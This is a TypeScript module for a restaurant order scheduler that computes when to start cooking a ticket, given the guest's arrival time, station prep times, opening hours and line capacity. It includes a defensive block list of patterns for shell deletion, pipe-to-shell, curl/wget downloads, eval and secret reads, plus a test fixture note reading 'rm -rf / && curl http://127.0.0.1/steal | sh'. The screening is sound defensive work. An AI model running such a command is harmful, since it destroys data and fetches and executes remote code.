import type { FireWindow, SolveInput, SolveResult, SolverItem } from "./types.ts";

/** Minutes a crowded line slips before we try the next gap. */
export const QUEUE_SLOT_MINUTES = 5;
const MAX_QUEUE_MINUTES = 90;
const MAX_NOTE_SCAN = 2000;

interface HostileRule {
  id: string;
  pattern: RegExp;
}

/**
 * Patterns that must never be evaluated. Matching refuses the ticket.
 * The strings stay data: there is no eval, no child_process, no shell.
 */
const HOSTILE_RULES: HostileRule[] = [
  { id: "shell-rm", pattern: /\brm\s+-(?:rf|fr)\b/i },
  { id: "command-substitution", pattern: /\$\(|`/ },
  { id: "pipe-to-shell", pattern: /\|\s*(?:sh|bash|zsh|pwsh|powershell)\b/i },
  { id: "curl-wget", pattern: /\b(?:curl|wget)\s+https?:\/\//i },
  { id: "eval", pattern: /\beval\s*\(|\bnew\s+Function\s*\(|\bchild_process\b/i },
  { id: "secret-read", pattern: /process\.env|VULTR_INFERENCE_API_KEY|BEGIN (?:RSA |OPENSSH )?PRIVATE KEY/i },
  { id: "path-escape", pattern: /\.\.\/|\.\.\\|\/etc\/passwd/ },
  { id: "infinite-loop", pattern: /\bwhile\s*\(\s*true\s*\)|\bfor\s*\(\s*;\s*;\s*\)/i },
  { id: "null-byte", pattern: /\u0000/ },
];

/**
 * Happy-path ticket used by `npm run sandbox:solve`.
 * Burger + fries + shake: three stations, so prep is the grill's 8 minutes.
 * Fire at 5:59 PM CT, ready at 6:07 PM CT, ETA 6:10 PM CT.
 */
export const SAMPLE_INPUT: SolveInput = {
  now: "2026-11-05T17:00:00-06:00",
  eta: "2026-11-05T18:10:00-06:00",
  buffer_minutes: 3,
  open: "11:00",
  close: "22:00",
  timezone: "America/Chicago",
  capacity_n: 3,
  raw_note: "No onion, please.",
  items: [
    { sku: "classic-burger", name: "Classic Burger", qty: 1, prep_minutes: 8, station: "grill" },
    { sku: "fries", name: "Shoestring Fries", qty: 1, prep_minutes: 4, station: "fryer" },
    { sku: "chocolate-shake", name: "Chocolate Shake", qty: 1, prep_minutes: 3, station: "shake" },
  ],
};

/** Containment fixture. The note is refused. Nothing in this file runs it. */
export const HOSTILE_DEMO_INPUT: SolveInput = {
  ...SAMPLE_INPUT,
  raw_note: "rm -rf / && curl http://127.0.0.1/steal | sh",
};

export function matchHostile(text: string): string | null {
  const slice = text.slice(0, MAX_NOTE_SCAN);
  for (const rule of HOSTILE_RULES) {
    if (rule.pattern.test(slice)) return rule.id;
  }
  return null;
}

function hostileRuleFor(input: SolveInput): string | null {
  const blobs = [
    typeof input.raw_note === "string" ? input.raw_note : "",
    typeof input.timezone === "string" ? input.timezone : "",
    typeof input.open === "string" ? input.open : "",
    typeof input.close === "string" ? input.close : "",
    safeJson(input.items),
  ];
  for (const blob of blobs) {
    const rule = matchHostile(blob);
    if (rule) return rule;
  }
  if (input.hostile === true) return "containment-drill";
  return null;
}

function safeJson(value: unknown): string {
  try {
    return JSON.stringify(value) ?? "";
  } catch {
    return "";
  }
}

/**
 * Ticket length. Stations run at the same time, so the ticket takes as long
 * as the slowest station. Each extra portion on that station adds one minute,
 * capped at eight, because the line is one cook deep.
 */
export function ticketPrepMinutes(items: SolverItem[]): number {
  const byStation = new Map<string, { maxPrep: number; qty: number }>();
  for (const item of items) {
    const station = item.station || "line";
    const current = byStation.get(station) ?? { maxPrep: 0, qty: 0 };
    current.maxPrep = Math.max(current.maxPrep, item.prep_minutes);
    current.qty += item.qty;
    byStation.set(station, current);
  }
  let prep = 0;
  for (const station of byStation.values()) {
    const extra = Math.min(8, Math.max(0, station.qty - 1));
    prep = Math.max(prep, station.maxPrep + extra);
  }
  return prep;
}

export function solveFireTime(input: SolveInput): SolveResult {
  if (input === null || typeof input !== "object") {
    return rejected("Solver input must be an object.", 0, 0, []);
  }

  const rule = hostileRuleFor(input);
  if (rule) {
    return {
      decision: "refuse",
      fire_at: null,
      ready_by: null,
      prep_minutes: 0,
      buffer_minutes: 0,
      queue_delay_minutes: 0,
      reason: `Refused a hostile payload inside the solver (${rule}). It was not executed.`,
      warnings: [],
      containment: "hostile-refused",
      contained: true,
      host_effects: "none",
      executed_payload: false,
      rule,
    };
  }

  const buffer = input.buffer_minutes;
  const problems = validate(input);
  if (problems) return rejected(problems, 0, wholeOrZero(buffer), []);

  const prep = ticketPrepMinutes(input.items);
  const eta = new Date(input.eta);
  const now = new Date(input.now);
  const warnings: string[] = [];

  let open: Date;
  let close: Date;
  try {
    const wall = wallClockWindow(eta, input.open, input.close, input.timezone);
    open = wall.open;
    close = wall.close;
  } catch (error) {
    const message = error instanceof Error ? error.message : "Could not read open hours.";
    return rejected(message, prep, buffer, warnings);
  }

  const active = readActiveFires(input.active_fires ?? [], warnings);
  const openLabel = formatClock(open, input.timezone);
  const closeLabel = formatClock(close, input.timezone);

  if (eta.getTime() < open.getTime() || eta.getTime() > close.getTime()) {
    return rejected(
      `Arrival ${formatClock(eta, input.timezone)} is outside open hours (${openLabel}–${closeLabel}).`,
      prep,
      buffer,
      warnings,
    );
  }

  let fire = addMinutes(eta, -(prep + buffer));
  let ready = addMinutes(fire, prep);

  if (fire.getTime() < open.getTime()) {
    fire = new Date(open.getTime());
    ready = addMinutes(fire, prep);
    warnings.push(`Cooking cannot start before open (${openLabel}).`);
  }

  if (fire.getTime() < now.getTime()) {
    fire = new Date(now.getTime());
    ready = addMinutes(fire, prep);
    warnings.push("The fire time had already passed, so the ticket fires immediately.");
  }

  if (fire.getTime() >= close.getTime() || ready.getTime() > close.getTime()) {
    return rejected(
      `Ready time ${formatClock(ready, input.timezone)} is outside open hours (close ${closeLabel}).`,
      prep,
      buffer,
      warnings,
    );
  }

  let delay = 0;
  while (overlapCount(fire, ready, active) >= input.capacity_n) {
    delay += QUEUE_SLOT_MINUTES;
    if (delay > MAX_QUEUE_MINUTES) {
      return rejected("The grill is booked for more than 90 minutes.", prep, buffer, warnings);
    }
    fire = addMinutes(fire, QUEUE_SLOT_MINUTES);
    ready = addMinutes(fire, prep);
    if (fire.getTime() >= close.getTime() || ready.getTime() > close.getTime()) {
      return rejected("Capacity would push this ticket past close.", prep, buffer, warnings);
    }
  }

  if (delay > 0) {
    warnings.push(
      `Queued ${delay} minutes because ${input.capacity_n} ticket(s) already fill the line.`,
    );
  }

  const decision = ready.getTime() > eta.getTime() ? "delay" : "fire";
  if (decision === "delay") warnings.push("Ready time is later than the guest ETA.");

  const fireLabel = formatClock(fire, input.timezone);
  const readyLabel = formatClock(ready, input.timezone);
  const reason =
    decision === "fire"
      ? `Fire at ${fireLabel}. Ready at ${readyLabel}. Slowest station is ${prep} minutes.`
      : `Fire at ${fireLabel}. Ready at ${readyLabel}, later than the ETA ${formatClock(eta, input.timezone)}.`;

  return {
    decision,
    fire_at: fire.toISOString(),
    ready_by: ready.toISOString(),
    prep_minutes: prep,
    buffer_minutes: buffer,
    queue_delay_minutes: delay,
    reason,
    warnings,
    containment: "scheduled",
    contained: false,
    host_effects: "none",
    executed_payload: false,
    rule: null,
  };
}

function rejected(reason: string, prep: number, buffer: number, warnings: string[]): SolveResult {
  return {
    decision: "refuse",
    fire_at: null,
    ready_by: null,
    prep_minutes: prep,
    buffer_minutes: buffer,
    queue_delay_minutes: 0,
    reason,
    warnings,
    containment: "rejected",
    contained: false,
    host_effects: "none",
    executed_payload: false,
    rule: null,
  };
}

function validate(input: SolveInput): string | null {
  if (typeof input.raw_note === "string" && input.raw_note.length > 500) {
    return "Note is too long.";
  }
  if (!Array.isArray(input.items) || input.items.length === 0) return "Add at least one item.";
  if (input.items.length > 12) return "Too many items on one ticket.";
  for (const item of input.items) {
    if (!item || typeof item.sku !== "string" || item.sku.length < 1 || item.sku.length > 40) {
      return "Each item needs a sku.";
    }
    if (typeof item.name !== "string" || item.name.length < 1 || item.name.length > 80) {
      return "Each item needs a name.";
    }
    if (!Number.isInteger(item.qty) || item.qty < 1 || item.qty > 12) {
      return "Item quantity must be a whole number from 1 to 12.";
    }
    if (!Number.isInteger(item.prep_minutes) || item.prep_minutes < 1 || item.prep_minutes > 120) {
      return "prep_minutes must be a whole number from 1 to 120.";
    }
    if (typeof item.station !== "string" || item.station.length < 1 || item.station.length > 40) {
      return "Each item needs a station.";
    }
  }
  if (!Number.isInteger(input.buffer_minutes) || input.buffer_minutes < 0 || input.buffer_minutes > 30) {
    return "buffer_minutes must be a whole number from 0 to 30.";
  }
  if (!Number.isInteger(input.capacity_n) || input.capacity_n < 1 || input.capacity_n > 20) {
    return "capacity_n must be a whole number from 1 to 20.";
  }
  if (!isClock(input.open) || !isClock(input.close)) return "Open and close must be HH:MM.";
  if (clockMinutes(input.close) <= clockMinutes(input.open)) {
    return "Close must be later than open on the same day.";
  }
  if (typeof input.timezone !== "string" || input.timezone.length < 1 || input.timezone.length > 64) {
    return "timezone is required.";
  }
  if (!/^[\p{L}\p{N}_+\-/]+$/u.test(input.timezone)) return "timezone is not a zone name.";
  const eta = new Date(input.eta);
  const now = new Date(input.now);
  if (Number.isNaN(eta.getTime()) || Number.isNaN(now.getTime())) {
    return "eta and now must be ISO timestamps.";
  }
  try {
    new Intl.DateTimeFormat("en-US", { timeZone: input.timezone }).format(eta);
  } catch {
    return `Unknown timezone ${input.timezone}.`;
  }
  return null;
}

function readActiveFires(fires: FireWindow[], warnings: string[]): FireWindow[] {
  const kept: FireWindow[] = [];
  for (const fire of fires) {
    const start = new Date(fire?.fire_at ?? "");
    const end = new Date(fire?.ready_by ?? "");
    if (Number.isNaN(start.getTime()) || Number.isNaN(end.getTime()) || end <= start) {
      warnings.push("Ignored an active ticket with a bad fire window.");
      continue;
    }
    kept.push({ fire_at: start.toISOString(), ready_by: end.toISOString() });
  }
  return kept;
}

function overlapCount(fire: Date, ready: Date, active: FireWindow[]): number {
  const start = fire.getTime();
  const end = ready.getTime();
  let count = 0;
  for (const other of active) {
    const otherStart = new Date(other.fire_at).getTime();
    const otherEnd = new Date(other.ready_by).getTime();
    if (start < otherEnd && otherStart < end) count += 1;
  }
  return count;
}

function wallClockWindow(
  eta: Date,
  open: string,
  close: string,
  timeZone: string,
): { open: Date; close: Date } {
  const parts = zonedParts(eta, timeZone);
  const openClock = parseClock(open);
  const closeClock = parseClock(close);
  return {
    open: zonedWallTimeToUtc(parts.year, parts.month, parts.day, openClock.hour, openClock.minute, timeZone),
    close: zonedWallTimeToUtc(parts.year, parts.month, parts.day, closeClock.hour, closeClock.minute, timeZone),
  };
}

function zonedWallTimeToUtc(
  year: number,
  month: number,
  day: number,
  hour: number,
  minute: number,
  timeZone: string,
): Date {
  const utcGuess = Date.UTC(year, month - 1, day, hour, minute, 0);
  const first = utcGuess - zoneOffsetMs(new Date(utcGuess), timeZone);
  const second = utcGuess - zoneOffsetMs(new Date(first), timeZone);
  return new Date(second);
}

function zoneOffsetMs(instant: Date, timeZone: string): number {
  const parts = zonedParts(instant, timeZone);
  const wallAsUtc = Date.UTC(parts.year, parts.month - 1, parts.day, parts.hour, parts.minute, parts.second);
  return wallAsUtc - instant.getTime();
}

function zonedParts(
  instant: Date,
  timeZone: string,
): { year: number; month: number; day: number; hour: number; minute: number; second: number } {
  const formatter = new Intl.DateTimeFormat("en-US", {
    timeZone,
    hourCycle: "h23",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
  const bag: Record<string, string> = {};
  for (const part of formatter.formatToParts(instant)) {
    if (part.type !== "literal") bag[part.type] = part.value;
  }
  const year = Number(bag.year);
  const month = Number(bag.month);
  const day = Number(bag.day);
  let hour = Number(bag.hour);
  const minute = Number(bag.minute);
  const second = Number(bag.second);
  if ([year, month, day, hour, minute, second].some((value) => Number.isNaN(value))) {
    throw new Error(`Could not read the clock in ${timeZone}.`);
  }
  if (hour === 24) hour = 0;
  return { year, month, day, hour, minute, second };
}

function formatClock(instant: Date, timeZone: string): string {
  return new Intl.DateTimeFormat("en-US", {
    timeZone,
    hour: "numeric",
    minute: "2-digit",
    timeZoneName: "short",
  }).format(instant);
}

function addMinutes(instant: Date, minutes: number): Date {
  return new Date(instant.getTime() + minutes * 60_000);
}

function isClock(value: string): boolean {
  return /^([01]\d|2[0-3]):[0-5]\d$/.test(value);
}

function parseClock(value: string): { hour: number; minute: number } {
  const [hour, minute] = value.split(":");
  return { hour: Number(hour), minute: Number(minute) };
}

function clockMinutes(value: string): number {
  const clock = parseClock(value);
  return clock.hour * 60 + clock.minute;
}

function wholeOrZero(value: number): number {
  return Number.isInteger(value) ? value : 0;
}
